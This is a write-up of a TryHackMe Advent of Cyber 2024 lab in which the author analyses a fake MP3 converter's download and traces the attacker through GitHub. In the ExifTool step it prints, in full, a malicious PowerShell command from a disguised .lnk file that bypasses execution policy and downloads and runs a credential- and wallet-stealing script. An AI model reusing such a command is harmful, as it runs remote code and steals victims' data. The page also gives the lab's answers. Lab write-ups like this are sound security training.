# 🎄 TryHackMe Advent of Cyber 2024 – Day 1: OPSEC Challenge

## Objectives 🎯

Day 1 begins the **Advent of Cyber 2024** with an exciting challenge to investigate a suspicious YouTube to MP3 converter website. The focus is on:
1. Analyzing downloaded files to uncover malicious behavior.
2. Investigating embedded metadata and suspicious scripts.
3. Tracing the attacker’s digital breadcrumbs to expose their OPSEC mistakes.

## Steps 🚀

### Step 1: Investigating the Website
1. **Access the website:**  
   Hosted at `10.10.200.221`, the site appeared to be a standard YouTube to MP3 converter.
2. **Download the files:**  
   I entered a YouTube link, which downloaded a `download.zip` file containing:
   - **`song.mp3`**: A legitimate audio file.
   - **`somg.mp3`**: A suspiciously named file.

### Step 2: File Analysis Using ExifTool
- **Analyzing `song.mp3`:**  
  Running `exiftool song.mp3` revealed nothing unusual—just a standard MP3 file.
- **Analyzing `somg.mp3`:**  
  Running `exiftool somg.mp3` revealed:
  - It was a Windows Shortcut file (`.lnk`), not an MP3.
  - Metadata contained an embedded PowerShell command:
    ```
    -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
    ```
  This command bypasses PowerShell execution policies, downloads a malicious script, and executes it.

### Step 3: Opening the Embedded URL
- **Inspect the URL:**  
  The URL hosted a PowerShell script designed to steal:
  - Cryptocurrency wallet files.
  - Browser credentials.
- **C2 Server:**  
  Stolen data was sent to a Command and Control (C2) server controlled by the attacker.

### Step 4: Tracing the Attacker on GitHub
- **Signature in Script:**  
  The script contained the signature:
  ```
  "Created by the one and only M.M."
  ```
- **Search Results:**  
  Searching GitHub for `"Created by the one and only M.M."` led to:
  - A repository owned by **M.M.**
  - Comments tying their account to malicious activity.

## Key Findings 🔑

1. **Legitimate File:** `song.mp3` was harmless.
2. **Malicious File:** `somg.mp3` contained a PowerShell command to execute a malicious script.
3. **C2 Server:** The attacker’s script sent stolen data to a remote server.
4. **Attacker Identity:** Poor OPSEC practices on GitHub exposed "M.M."

## Lessons Learned 🌟

### OPSEC Failures
1. **Reused Aliases:**  
   The attacker used the same alias ("M.M.") across platforms, making them easier to track.
2. **Identifiable Metadata:**  
   Including a signature in the script created a direct link to their identity.
3. **Public Interactions:**  
   GitHub comments connected their profile to the malicious activity.

### Tools and Techniques 🛠️
1. [ExifTool](https://exiftool.org/) – Extracted metadata to uncover the embedded PowerShell command.
2. **Browser Inspection:** Investigated URLs to find malicious scripts.
3. [GitHub Search](https://github.com/) – Traced the attacker through their digital breadcrumbs.

## Final Thoughts 🎁

Day 1 was an excellent introduction to metadata analysis and attacker investigation. Tracking down M.M. using GitHub highlighted how OPSEC failures can leave attackers exposed. This challenge provided a perfect mix of technical analysis and detective work to kick off the Advent of Cyber!

### Answers ✅
1. **What file was harmless?**  
   **Answer:** `song.mp3`
2. **What was the embedded PowerShell command used for?**  
   **Answer:** Bypassed execution policies, downloaded a malicious script, and executed it.
3. **What is the attacker’s alias?**  
   **Answer:** `M.M.`

## Table of Contents 📚

| Day  | Challenge                              | Day  | Challenge                               | Day  | Challenge                               |
|------|----------------------------------------|------|-----------------------------------------|------|-----------------------------------------|
| 📖  | [README](README.md)                    | 11   | [Wi-Fi Attacks](day_11.md)             | 22   | [Kubernetes DFIR](day_22.md)            |
| 1    | **OPSEC Challenge**                    | 12   | [Web Timing Attacks](day_12.md)        | 23   | [Hash Cracking](day_23.md)              |
| 2    | [Log Analysis](day2.md)                | 13   | [WebSockets](day_13.md)                | 24   | [Hash Cracking](day_23.md)              |
| 3    | [Log Analysis](day3.md)                | 14   | [Certificate Mismanagement](day_14.md) | 25   |                                         |
| 4    | [Atomic Red Team](day4.md)             | 15   | [Active Directory](day_15.md)          | 26   |                                         |
| 5    | [XXE](day5.md)                         | 16   | [Azure Exploitation](day_16.md)        | 27   |                                         |
| 6    | [Sandboxes](day6.md)                   | 17   | [Log Analysis](day_17.md)              | 28   |                                         |
| 7    | [AWS Sandboxes](day7.md)               | 18   | [Prompt Injection](day_18.md)          | 29   |                                         |
| 8    | [Shellcodes](day8.md)                  | 19   | [Game Hacking](day_19.md)              | 30   |                                         |
| 9    | [Risk Assessment](day9.md)             | 20   | [Traffic Analysis](day_20.md)          | 31   |                                         |
| 10   | [Phishing](day_10.md)                  | 21   | [Reverse Engineering](day_21.md)       | ☃️  | 🎄🎅🎁✨                              |
